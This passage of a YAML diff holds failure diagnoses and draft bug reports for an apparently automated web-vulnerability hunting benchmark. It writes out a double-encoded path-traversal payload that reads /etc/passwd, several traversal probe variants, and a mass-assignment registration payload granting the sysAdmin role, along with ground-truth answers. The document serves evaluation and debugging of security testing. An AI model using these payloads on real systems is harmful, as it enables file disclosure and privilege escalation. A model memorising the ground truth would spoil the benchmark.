+    ref: skills/web-vulnerability-testing/path-traversal-lfi-rfi/references/traversal-encoding-matrix.md
+    note: |-
+      Names double percent-encoding "where the front-end decodes to a second encoding that the application decodes again" and requires the separator axis and an in-root control; the run tried the dot-encoding axis and alternate separators, not the double-encoded forward slash.
+  - source: design_doc
+    ref: eval/instances/eval-server-1/docs/design/threat-model-impact-elicitation-adr.md
+    note: |-
+      "A precursor is a capability entity, not a row"; only a threat carries a victim and damaged property and reaches the hunter. An ASSUMED read primitive filed as a precursor therefore produces no probe.
+  closest_issue: null
+  proposed_issue:
+    title: "Traversal-read closes /api/file/ as an ASSUMED precursor without the double-encoded separator or an in-root control"
+    body: |-
+      ## Observed
+      In trial white-jotter-1-20261028T083326-1618c524 (project fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5) ReverseProxy V-4 bound the /api/file/ path traversal at ASSUMED standing and filed it as precursor IA-24/P-5; no traversal threat was produced. Service:media-asset-serving, which owns the namespace, explicitly refused to re-open the hunt and closed with zero threats.
+
+      The deployed handler is `LibraryController.readCoverFile` (`setup_files/environment/inserted_vulns/white-jotter-upload-file-read-traversal.patch`), which strips the prefix, decodes twice and joins the result to the upload directory with no containment check; it returns an empty 404 when the target is not a file. The GT exploit reads /etc/passwd with `..%252f..%252f..%252fetc%252fpasswd`.
+
+      The run's probes used `..;/..;/..;/windows/win.ini`, `..%5c..%5cwindows%5cwin.ini`, `%2e%2e%5c`, `%252e%252e%255c`, `....//....//windows/win.ini` and `%2e%2e/%2e%2e`; it never tried the literal-dot, double-encoded forward-slash separator. It also had no in-root control because the published cover name returns 404, so it treated the containment as uncalibrated rather than promoting the capability.
+
+      ## Impact
+      white-jotter-006 is missed because a live, double-decoding read primitive was closed as an ASSUMED precursor with no probe of the shape that works. The one channel that carries the GT read produced no threat, no spec and no pod.
+
+      ## Proposed direction
+      1. Require a `%252f` (double-encoded forward-slash) separator probe as a first-class shape whenever a wildcard read route is mapped, distinct from the double-encoded dot shapes.
+      2. Treat a uniform empty 404 under a mapped API prefix as ambiguous, not as route absence: require an in-root control that certainly resolves, or an out-of-band proof, before closing the containment question.
+      3. Do not let a live read primitive close as a zero-threat ASSUMED precursor; emit a hunter-dispatchable threat for the cheapest falsifying probe, or record the un-dispatched capability on the run terminal.
+      4. Correct V-4's handler attribution to the live mapping so the containment reasoning starts from a hand-written reader, not a framework resolver.
+    labels: [bug, needs-triage]
+  eval_sha: 5cadea78d4a4b8a88bf5284f29db14f29f1690ac
+  stack_fingerprint: 84d14309e4c4c4ebd9706f890f7bf04455e1068efb2ab9dfff8cc4a4d707b6e0
+
+- vuln: white-jotter-007
+  failure_mode: pod_diverged_trajectory
+  root_cause:
+    type: implementation_defect
+    combination_of: [design_defect]
+    extended_description: |-
+      The ground truth is mass assignment at the public registration endpoint. The exploit keeps the normal register fields and adds roles:[{"id":1}] (the sysAdmin role), then signs in and reads the back office as an administrator (white-jotter-007/metadata.json and report.md).
+
+      The hunter authored the correct spec and the pod executed it. RESTApi-api__threat-1 dispatched mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role; its experiment log 1 is an explicit confirmation: "CONFIRMED privilege escalation via nested relation write on unauthenticated POST /api/register", with the control body (no roles) returning /api/menu {code:200,result:[]} 43 B and the payload body returning a 1575 B four-node admin tree, /api/admin/role 5549 B including sysAdmin id 1, role/perm 293 B, durable across a fresh re-login. That is exactly the GT symptom.
+
+      The pod's durable export nevertheless says verdict unsuccessful, terminal_reason pod-watchdog-timeout, iterations 1, clean false, interpretations []. The runner had concluded and written the summary; the triager never produced a decision and the 3600 s session window expired, so the watchdog finaliser stamped an infrastructure terminal and the confirmed symptom was discarded. A sibling pod proves the same loss with a completed triage: mass-assignment-nested-relation-write__roles-array-by-id__role-grant-set carries an interpretation classified "symptom-confirmed" (role id 14 with a caller-authored grant set), yet its export is also verdict unsuccessful, pod-watchdog-timeout, clean false.
+
+      The mechanism is in the code: surfer.py gives every pod session DEFAULT_POD_SESSION_TIMEOUT_S = 3600.0 and, on asyncio.TimeoutError, calls finalize_pod with PodTerminal.infrastructure(reason=POD_WATCHDOG_TIMEOUT), which by construction has verdict unsuccessful and clean False. The finalizer returns an existing terminal unchanged, but the domain terminal node is only reached after the triager returns; a slow or stalled staged triage therefore loses a confirmed runner summary.
+
+      The design makes this the normal path, not a backstop: 17 of the run's 47 PodExports carry pod-watchdog-timeout, and 5 more carry no-symptom-evidence. A pod that confirms the GT symptom but loses its domain terminal is scored unsuccessful, so the assessment can only mark the vulnerability partial.
+  diagnosis_overview: |-
+    white-jotter-007 is mass assignment at POST /api/register: the body keeps the five normal fields and adds roles:[{"id":1}], then the new account reads the back office as administrator.
+    The hunter authored the right spec (RESTApi-api__threat-1, roles-array-by-id/sysadmin-role) and the pod executed it. Its experiment log records the exact GT symptom: the roles payload yields a 1575 B admin menu, /api/admin/role 5549 B with sysAdmin id 1, durable across a fresh login, while the no-roles control yields [].
+    The pod's durable export is nevertheless unsuccessful with terminal_reason pod-watchdog-timeout, iterations 1, clean false and no interpretation: the runner concluded, the triager never produced a decision, and the 3600 s window expired. A sibling mass-assignment pod shows the same loss with a symptom-confirmed interpretation but a watchdog terminal.
+    The watchdog finaliser always stamps unsuccessful and clean false, and 17 of 47 pod exports hit it, so a confirming pod routinely loses its verdict.
+    Typed root cause: an implementation defect in the pod terminal path (watchdog finalisation discards a confirmed runner summary and triager interpretation), combined with a design in which the watchdog is the normal path rather than a backstop.
+  evidences:
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-007/metadata.json
+    note: |-
+      Location http://wj:8443/api/register, Vulnerability Type "IDOR / Unauthorized Write or Overwrite"; the report names mass assignment through the roles field.
+  - source: ground_truth
+    ref: /root/WebExploitBench/white-jotter/vulnerability/white-jotter-007/report/report.md
+    note: |-
+      Keep the normal registration fields, add a roles array with the administrator role id, register, sign in, and confirm administrative privileges.
+  - source: test_spec
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/hunter/test-specs/RESTApi-api__threat-1/consumed/mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role.yaml
+    note: |-
+      The spec's verification symptoms require a non-empty admin menu tree, a roster row reporting sysAdmin, and the role administration surface answering on the new session, against a no-roles control.
+  - source: experiment_log
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role/experiment-log/1.yaml
+    note: |-
+      Experiment summary: "CONFIRMED privilege escalation via nested relation write on unauthenticated POST /api/register"; control /api/menu {code:200,result:[]} 43 B; payload roles:[{"id":1}] gives /api/menu 1575 B, /api/admin/role 5549 B including sysAdmin id 1, role/perm 293 B, durable on fresh re-login.
+  - source: experiment_log
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role/experiment-log/0.yaml
+    note: |-
+      Raw observations for the sysadmin-role variant, including the unauthenticated control read and the post-registration reads behind the summary.
+  - source: pod_export
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role/aac5ecac-f119-4e26-9f21-fc259153ccf3.yaml
+    note: |-
+      verdict unsuccessful, terminal_reason pod-watchdog-timeout, iterations 1, clean false, interpretations []. The confirmed runner summary never becomes a domain terminal.
+  - source: pod_export
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod/mass-assignment-nested-relation-write__roles-array-by-id__role-grant-set/aac5ecac-f119-4e26-9f21-fc259153ccf3.yaml
+    note: |-
+      Sibling pod with an interpretation classified "symptom-confirmed" (role id 14 with a caller-authored grant set) yet also verdict unsuccessful, pod-watchdog-timeout, clean false; the watchdog discards a completed triage too.
+  - source: code
+    ref: eval/instances/eval-server-1/src/polymerhus/attack/hunting/surfer.py
+    note: |-
+      DEFAULT_POD_SESSION_TIMEOUT_S = 3600.0 (line 220); on asyncio.TimeoutError the session is finalized with PodTerminal.infrastructure(reason=POD_WATCHDOG_TIMEOUT) (line 1080), which is always verdict unsuccessful and clean False.
+  - source: code
+    ref: eval/instances/eval-server-1/src/polymerhus/attack/hunting/pod/finalize.py
+    note: |-
+      PodTerminal.infrastructure fixes verdict "unsuccessful" and clean False; finalize_pod returns an existing terminal unchanged, so a domain terminal must already be durable before the watchdog fires, which it was not here.
+  - source: code
+    ref: eval/instances/eval-server-1/src/polymerhus/attack/hunting/pod/graph.py
+    note: |-
+      The domain terminal is reached only after the triager returns (decide_router sends any non-"variant" decision to "terminal"); the runner's experiment_summary alone does not author the export.
+  - source: data_root
+    ref: fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5/hunting/test-executor-pod
+    note: |-
+      17 of 47 PodExports carry terminal_reason pod-watchdog-timeout, so the watchdog is the normal end for a large share of pods.
+  closest_issue: null
+  proposed_issue:
+    title: "A confirming pod is exported as unsuccessful when the triager misses the 3600 s watchdog"
+    body: |-
+      ## Observed
+      In trial white-jotter-1-20261028T083326-1618c524 (project fe446230-1f19-41c7-bf2e-b7b4b9c6f0f5) the mass-assignment spec `mass-assignment-nested-relation-write__roles-array-by-id__sysadmin-role` executed the GT test and its experiment log confirms the exact symptom: registering with `roles:[{"id":1}]` yields a 1575 B admin menu, `/api/admin/role` 5549 B including sysAdmin id 1, durable across a fresh login, while the no-roles control yields `[]`.
+
+      The durable PodExport is nevertheless `verdict: unsuccessful`, `terminal_reason: pod-watchdog-timeout`, `iterations: 1`, `clean: false`, `interpretations: []`. The runner concluded and wrote the summary; the triager never returned a decision, and the 3600 s session window expired. A sibling pod (`...__role-grant-set`) even carries a `symptom-confirmed` interpretation and is still exported as unsuccessful with the same watchdog reason.
+
+      `surfer.py` sets `DEFAULT_POD_SESSION_TIMEOUT_S = 3600.0` and, on timeout, calls `finalize_pod(PodTerminal.infrastructure(reason=POD_WATCHDOG_TIMEOUT))`, which is always `unsuccessful` and `clean=False`. The domain terminal is only reached after the triager returns. 17 of the run's 47 pod exports are watchdog timeouts, so this is the normal path rather than a backstop.
+
+      ## Impact
+      A fully confirmed GT vulnerability is scored partial because the pod's terminal, not the pod's evidence, decided the verdict. The same mechanism can hide any confirmed symptom whose triage is slow.
+
+      ## Proposed direction
+      1. Let the pod exceed or renew its window while the triager is progressing, or bound the triager's stages so a confirming run always reaches its terminal.
+      2. When the watchdog fires, salvage any durable `experiment_summary` or `symptom-confirmed` interpretation into the export instead of unconditionally stamping unsuccessful and clean false.
+      3. Emit a distinct harness terminal (for example `pod-triager-stalled`) so the assessment can separate a harness failure from a genuine negative.
+      4. Treat the watchdog as a backstop: investigate why 17 of 47 pods consume it before treating any watchdog export as evidence of absence.
+    labels: [bug, needs-triage]
+  eval_sha: 5cadea78d4a4b8a88bf5284f29db14f29f1690ac
+  stack_fingerprint: 84d14309e4c4c4ebd9706f890f7bf04455e1068efb2ab9dfff8cc4a4d707b6e0
